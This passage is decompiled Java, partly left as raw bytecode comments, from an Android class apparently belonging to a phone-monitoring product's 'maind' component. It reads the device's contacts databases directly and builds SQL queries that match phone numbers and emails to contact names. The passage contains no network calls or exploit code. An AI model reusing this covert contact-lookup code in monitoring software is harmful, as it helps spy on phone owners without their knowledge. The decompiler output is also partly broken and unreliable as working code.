    //   252	259	384	finally
    //   260	267	384	finally
    //   267	272	384	finally
    //   320	323	384	finally
    //   155	162	388	android/database/sqlite/SQLiteException
    //   169	172	388	android/database/sqlite/SQLiteException
    //   184	191	388	android/database/sqlite/SQLiteException
    //   191	196	388	android/database/sqlite/SQLiteException
    //   221	228	388	android/database/sqlite/SQLiteException
    //   241	248	388	android/database/sqlite/SQLiteException
    //   252	259	388	android/database/sqlite/SQLiteException
    //   260	267	388	android/database/sqlite/SQLiteException
    //   267	272	388	android/database/sqlite/SQLiteException
  }
  
  /* Error */
  private static byte[] b(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    // Byte code:
    //   0: getstatic 12	com/vvt/AppEngine1/AppEngine1:a	Z
    //   3: istore_2
    //   4: iload_2
    //   5: ifeq +3 -> 8
    //   8: getstatic 12	com/vvt/AppEngine1/AppEngine1:a	Z
    //   11: istore_2
    //   12: iload_2
    //   13: ifeq +3 -> 16
    //   16: iconst_0
    //   17: newarray <illegal type>
    //   19: astore_3
    //   20: invokestatic 188	com/vvt/AppEngine1/AppEngine1:removeFromPath	()Ljava/lang/String;
    //   23: astore 4
    //   25: iconst_2
    //   26: istore 5
    //   28: iload 5
    //   30: anewarray 40	java/lang/String
    //   33: astore 6
    //   35: iconst_0
    //   36: istore 7
    //   38: aconst_null
    //   39: astore 8
    //   41: ldc -66
    //   43: astore 9
    //   45: aload 6
    //   47: iconst_0
    //   48: aload 9
    //   50: aastore
    //   51: iconst_1
    //   52: istore 7
    //   54: aload 6
    //   56: iload 7
    //   58: aload_1
    //   59: aastore
    //   60: aload_0
    //   61: aload 4
    //   63: aload 6
    //   65: invokevirtual 50	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   68: astore 6
    //   70: iconst_m1
    //   71: istore_2
    //   72: aload 6
    //   74: ifnull +40 -> 114
    //   77: aload 6
    //   79: invokeinterface 193 1 0
    //   84: istore 7
    //   86: iload 7
    //   88: ifeq +26 -> 114
    //   91: ldc -61
    //   93: astore 4
    //   95: aload 6
    //   97: aload 4
    //   99: invokeinterface 68 2 0
    //   104: istore_2
    //   105: aload 6
    //   107: iload_2
    //   108: invokeinterface 199 2 0
    //   113: istore_2
    //   114: aload 6
    //   116: ifnull +10 -> 126
    //   119: aload 6
    //   121: invokeinterface 59 1 0
    //   126: getstatic 12	com/vvt/AppEngine1/AppEngine1:a	Z
    //   129: istore 5
    //   131: iload 5
    //   133: ifeq +3 -> 136
    //   136: iconst_0
    //   137: istore 5
    //   139: aconst_null
    //   140: astore 6
    //   142: invokestatic 201	com/vvt/AppEngine1/AppEngine1:a	()Ljava/lang/String;
    //   145: astore 8
    //   147: iconst_2
    //   148: istore 10
    //   150: iload 10
    //   152: anewarray 40	java/lang/String
    //   155: astore 9
    //   157: iconst_0
    //   158: istore 11
    //   160: ldc -53
    //   162: astore 12
    //   164: aload 9
    //   166: iconst_0
    //   167: aload 12
    //   169: aastore
    //   170: iconst_1
    //   171: istore 11
    //   173: iload_2
    //   174: invokestatic 206	java/lang/String:valueOf	(I)Ljava/lang/String;
    //   177: astore 4
    //   179: aload 9
    //   181: iload 11
    //   183: aload 4
    //   185: aastore
    //   186: aload_0
    //   187: aload 8
    //   189: aload 9
    //   191: invokevirtual 50	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   194: astore 6
    //   196: aload 6
    //   198: ifnull +125 -> 323
    //   201: aload 6
    //   203: invokeinterface 193 1 0
    //   208: istore_2
    //   209: iload_2
    //   210: ifeq +113 -> 323
    //   213: ldc -48
    //   215: astore 4
    //   217: aload 6
    //   219: aload 4
    //   221: invokeinterface 68 2 0
    //   226: istore_2
    //   227: aload 6
    //   229: iload_2
    //   230: invokeinterface 212 2 0
    //   235: astore 4
    //   237: aload 6
    //   239: invokeinterface 59 1 0
    //   244: aload 6
    //   246: ifnull +10 -> 256
    //   249: aload 6
    //   251: invokeinterface 59 1 0
    //   256: getstatic 12	com/vvt/AppEngine1/AppEngine1:a	Z
    //   259: istore 5
    //   261: iload 5
    //   263: ifeq +3 -> 266
    //   266: aload 4
    //   268: areturn
    //   269: astore 4
    //   271: aload 6
    //   273: ifnull +10 -> 283
    //   276: aload 6
    //   278: invokeinterface 59 1 0
    //   283: aload 4
    //   285: athrow
    //   286: astore 4
    //   288: iconst_0
    //   289: newarray <illegal type>
    //   291: astore 4
    //   293: getstatic 17	com/vvt/AppEngine1/AppEngine1:removeFromPath	Z
    //   296: istore 5
    //   298: iload 5
    //   300: ifeq -44 -> 256
    //   303: goto -47 -> 256
    //   306: astore 4
    //   308: aload 6
    //   310: ifnull +10 -> 320
    //   313: aload 6
    //   315: invokeinterface 59 1 0
    //   320: aload 4
    //   322: athrow
    //   323: aload_3
    //   324: astore 4
    //   326: goto -82 -> 244
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	329	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	329	1	paramString	String
    //   3	10	2	bool1	boolean
    //   71	103	2	i	int
    //   208	2	2	bool2	boolean
    //   226	4	2	j	int
    //   19	305	3	arrayOfByte1	byte[]
    //   23	244	4	localObject1	Object
    //   269	15	4	localObject2	Object
    //   286	1	4	localException	Exception
    //   291	1	4	arrayOfByte2	byte[]
    //   306	15	4	localObject3	Object
    //   324	1	4	arrayOfByte3	byte[]
    //   26	3	5	k	int
    //   129	170	5	bool3	boolean
    //   33	281	6	localObject4	Object
    //   36	51	7	bool4	boolean
    //   39	149	8	str1	String
    //   43	147	9	localObject5	Object
    //   148	3	10	m	int
    //   158	24	11	n	int
    //   162	6	12	str2	String
    // Exception table:
    //   from	to	target	type
    //   77	84	269	finally
    //   97	104	269	finally
    //   107	113	269	finally
    //   20	23	286	java/lang/Exception
    //   28	33	286	java/lang/Exception
    //   48	51	286	java/lang/Exception
    //   58	60	286	java/lang/Exception
    //   63	68	286	java/lang/Exception
    //   119	126	286	java/lang/Exception
    //   126	129	286	java/lang/Exception
    //   249	256	286	java/lang/Exception
    //   276	283	286	java/lang/Exception
    //   283	286	286	java/lang/Exception
    //   313	320	286	java/lang/Exception
    //   320	323	286	java/lang/Exception
    //   142	145	306	finally
    //   150	155	306	finally
    //   167	170	306	finally
    //   173	177	306	finally
    //   183	186	306	finally
    //   189	194	306	finally
    //   201	208	306	finally
    //   219	226	306	finally
    //   229	235	306	finally
    //   237	244	306	finally
  }
  
  public static int c()
  {
    int i = 3;
    String str1 = Build.VERSION.RELEASE;
    String str2 = "1.5";
    boolean bool = str1.startsWith(str2);
    if (bool) {}
    for (;;)
    {
      return i;
      try
      {
        i = d();
      }
      catch (VerifyError localVerifyError) {}
    }
  }
  
  /* Error */
  public static byte[] c(String paramString)
  {
    // Byte code:
    //   0: getstatic 12	com/vvt/AppEngine1/AppEngine1:a	Z
    //   3: istore_1
    //   4: iload_1
    //   5: ifeq +3 -> 8
    //   8: iconst_0
    //   9: istore_1
    //   10: aconst_null
    //   11: astore_2
    //   12: iconst_0
    //   13: istore_3
    //   14: iconst_0
    //   15: invokestatic 79	com/vvt/AppEngine1/e:a	(Z)Landroid/database/sqlite/SQLiteDatabase;
    //   18: astore 4
    //   20: aload 4
    //   22: ifnull +15 -> 37
    //   25: aload 4
    //   27: invokevirtual 83	android/database/sqlite/SQLiteDatabase:getPath	()Ljava/lang/String;
    //   30: astore 5
    //   32: aload 5
    //   34: ifnonnull +13 -> 47
    //   37: getstatic 12	com/vvt/AppEngine1/AppEngine1:a	Z
    //   40: istore_3
    //   41: iload_3
    //   42: ifeq +3 -> 45
    //   45: aload_2
    //   46: areturn
    //   47: aload 4
    //   49: ifnull +27 -> 76
    //   52: aload 4
    //   54: invokevirtual 232	android/database/sqlite/SQLiteDatabase:isDbLockedByCurrentThread	()Z
    //   57: istore 6
    //   59: iload 6
    //   61: ifne +15 -> 76
    //   64: aload 4
    //   66: invokevirtual 235	android/database/sqlite/SQLiteDatabase:isDbLockedByOtherThreads	()Z
    //   69: istore 6
    //   71: iload 6
    //   73: ifeq +46 -> 119
    //   76: getstatic 17	com/vvt/AppEngine1/AppEngine1:removeFromPath	Z
    //   79: istore 6
    //   81: iload 6
    //   83: ifeq +3 -> 86
    //   86: aload 4
    //   88: ifnull +8 -> 96
    //   91: aload 4
    //   93: invokevirtual 60	android/database/sqlite/SQLiteDatabase:close	()V
    //   96: aload_2
    //   97: ifnull +59 -> 156
    //   100: getstatic 12	com/vvt/AppEngine1/AppEngine1:a	Z
    //   103: istore_3
    //   104: iload_3
    //   105: ifeq +3 -> 108
    //   108: getstatic 12	com/vvt/AppEngine1/AppEngine1:a	Z
    //   111: istore_3
    //   112: iload_3
    //   113: ifeq -68 -> 45
    //   116: goto -71 -> 45
    //   119: aload_0
    //   120: ifnull +10 -> 130
    //   123: aload 4
    //   125: aload_0
    //   126: invokestatic 238	com/vvt/AppEngine1/AppEngine1:removeFromPath	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)[B
    //   129: astore_2
    //   130: aload 4
    //   132: ifnull -36 -> 96
    //   135: aload 4
    //   137: invokevirtual 60	android/database/sqlite/SQLiteDatabase:close	()V
    //   140: goto -44 -> 96
    //   143: astore_2
    //   144: aload 4
    //   146: ifnull +8 -> 154
    //   149: aload 4
    //   151: invokevirtual 60	android/database/sqlite/SQLiteDatabase:close	()V
    //   154: aload_2
    //   155: athrow
    //   156: getstatic 12	com/vvt/AppEngine1/AppEngine1:a	Z
    //   159: istore_3
    //   160: iload_3
    //   161: ifeq -53 -> 108
    //   164: goto -56 -> 108
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	167	0	paramString	String
    //   3	7	1	bool1	boolean
    //   11	119	2	arrayOfByte	byte[]
    //   143	12	2	localObject	Object
    //   13	148	3	bool2	boolean
    //   18	132	4	localSQLiteDatabase	SQLiteDatabase
    //   30	3	5	str	String
    //   57	25	6	bool3	boolean
    // Exception table:
    //   from	to	target	type
    //   125	129	143	finally
  }
  
  private static int d()
  {
    return Build.VERSION.SDK_INT;
  }
  
  private static String d(String paramString)
  {
    int i = 2;
    int j = 1;
    String str1 = com.vvt.ah.a.a(paramString);
    Object[] arrayOfObject1 = new Object[i];
    arrayOfObject1[0] = "phones";
    arrayOfObject1[j] = "number";
    String str2 = String.format("LTRIM(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(%s.%s, '(', ''), ')', ''), '+','') , '-', ''), ' ', ''), 0)", arrayOfObject1);
    Object[] arrayOfObject2 = new Object[16];
    arrayOfObject2[0] = str2;
    arrayOfObject2[j] = "people";
    arrayOfObject2[i] = "name";
    arrayOfObject2[3] = "phones";
    arrayOfObject2[4] = "people";
    arrayOfObject2[5] = "people";
    arrayOfObject2[6] = "_id";
    arrayOfObject2[7] = "phones";
    arrayOfObject2[8] = "person";
    arrayOfObject2[9] = str1;
    arrayOfObject2[10] = str1;
    arrayOfObject2[11] = "%";
    arrayOfObject2[12] = str1;
    arrayOfObject2[13] = str1;
    arrayOfObject2[14] = str1;
    arrayOfObject2[15] = str1;
    return String.format("SELECT %s AS normalized_number, %s.%s FROM %s LEFT JOIN %s ON %s.%s = %s.%s WHERE (LENGTH(normalized_number) > 4 AND LENGTH('%s') > 4) AND ((LENGTH('%s') <= LENGTH(normalized_number) AND normalized_number LIKE '%s%s') OR (LENGTH('%s') > LENGTH(normalized_number) AND normalized_number = SUBSTR('%s', LENGTH('%s') - LENGTH(normalized_number) + 1, LENGTH(normalized_number))))", arrayOfObject2);
  }
  
  private static String e(String paramString)
  {
    int i = 4;
    int j = 3;
    int k = 2;
    int m = 1;
    String str1 = com.vvt.ah.a.a(paramString);
    String str2 = PhoneNumberUtils.getStrippedReversed(str1);
    Object[] arrayOfObject1 = new Object[m];
    arrayOfObject1[0] = "normalized_number";
    String str3 = String.format("LTRIM(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(%s, '(', ''), ')', ''), '+','') , '-', ''), ' ', ''), 0)", arrayOfObject1);
    Object[] arrayOfObject2 = new Object[6];
    arrayOfObject2[0] = str1;
    arrayOfObject2[m] = str1;
    arrayOfObject2[k] = "%";
    arrayOfObject2[j] = str1;
    arrayOfObject2[i] = str1;
    arrayOfObject2[5] = str1;
    str1 = String.format("(LENGTH(number) > 4 AND LENGTH('%s') > 4) AND ((LENGTH('%s') <= LENGTH(number) AND number LIKE '%s%s') OR (LENGTH('%s') > LENGTH(number) AND number = SUBSTR('%s', -LENGTH(number))))", arrayOfObject2);
    arrayOfObject2 = new Object[9];
    arrayOfObject2[0] = str3;
    arrayOfObject2[m] = "display_name";
    arrayOfObject2[k] = "phone_lookup";
    arrayOfObject2[j] = "raw_contacts";
    arrayOfObject2[i] = "phone_lookup";
    arrayOfObject2[5] = "raw_contact_id";
    arrayOfObject2[6] = "raw_contacts";
    arrayOfObject2[7] = "_id";
    arrayOfObject2[8] = str1;
    str1 = String.format("SELECT %s AS number, %s AS name FROM %s LEFT JOIN %s ON %s.%s = %s.%s WHERE (%s)", arrayOfObject2);
    arrayOfObject1 = new Object[m];
    arrayOfObject1[0] = "normalized_number";
    str3 = String.format("RTRIM(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(%s, '(', ''), ')', ''), '+','') , '-', ''), ' ', ''), 0)", arrayOfObject1);
    arrayOfObject2 = new Object[6];
    arrayOfObject2[0] = str2;
    arrayOfObject2[m] = str2;
    arrayOfObject2[k] = str2;
    arrayOfObject2[j] = "%";
    arrayOfObject2[i] = str2;
    arrayOfObject2[5] = str2;
    str2 = String.format("(LENGTH(number) > 4 AND LENGTH('%s') > 4) AND ((LENGTH('%s') <= LENGTH(number) AND number LIKE '%s%s') OR (LENGTH('%s') > LENGTH(number) AND number = SUBSTR('%s', 1, LENGTH(number))))", arrayOfObject2);
    arrayOfObject2 = new Object[9];
    arrayOfObject2[0] = str3;
    arrayOfObject2[m] = "display_name";
    arrayOfObject2[k] = "phone_lookup";
    arrayOfObject2[j] = "raw_contacts";
    arrayOfObject2[i] = "phone_lookup";
    arrayOfObject2[5] = "raw_contact_id";
    arrayOfObject2[6] = "raw_contacts";
    arrayOfObject2[7] = "_id";
    arrayOfObject2[8] = str2;
    str2 = String.format("SELECT %s AS number, %s AS name FROM %s LEFT JOIN %s ON %s.%s = %s.%s WHERE (%s)", arrayOfObject2);
    arrayOfObject1 = new Object[k];
    arrayOfObject1[0] = str1;
    arrayOfObject1[m] = str2;
    return String.format("%s UNION %s", arrayOfObject1);
  }
  
  private static String f(String paramString)
  {
    Object[] arrayOfObject = new Object[12];
    arrayOfObject[0] = "people";
    arrayOfObject[1] = "name";
    arrayOfObject[2] = "contact_methods";
    arrayOfObject[3] = "data";
    arrayOfObject[4] = "contact_methods";
    arrayOfObject[5] = "people";
    arrayOfObject[6] = "people";
    arrayOfObject[7] = "_id";
    arrayOfObject[8] = "contact_methods";
    arrayOfObject[9] = "person";
    arrayOfObject[10] = "data";
    arrayOfObject[11] = paramString;
    return String.format("SELECT %s.%s, %s.%s FROM %s LEFT JOIN %s ON %s.%s = %s.%s WHERE %s = '%s'", arrayOfObject);
  }
  
  private static String g(String paramString)
  {
    Object[] arrayOfObject = new Object[15];
    arrayOfObject[0] = "data1";
    arrayOfObject[1] = "display_name";
    arrayOfObject[2] = "data";
    arrayOfObject[3] = "name_lookup";
    arrayOfObject[4] = "name_lookup";
    arrayOfObject[5] = "data_id";
    arrayOfObject[6] = "data";
    arrayOfObject[7] = "_id";
    arrayOfObject[8] = "raw_contacts";
    arrayOfObject[9] = "name_lookup";
    arrayOfObject[10] = "raw_contact_id";
    arrayOfObject[11] = "raw_contacts";
    arrayOfObject[12] = "_id";
    arrayOfObject[13] = "data1";
    arrayOfObject[14] = paramString;
    return String.format("SELECT %s as data, %s as name FROM %s LEFT JOIN %s ON %s.%s = %s.%s LEFT JOIN %s ON %s.%s = %s.%s WHERE %s = '%s'", arrayOfObject);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/AppEngine1/AppEngine1.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */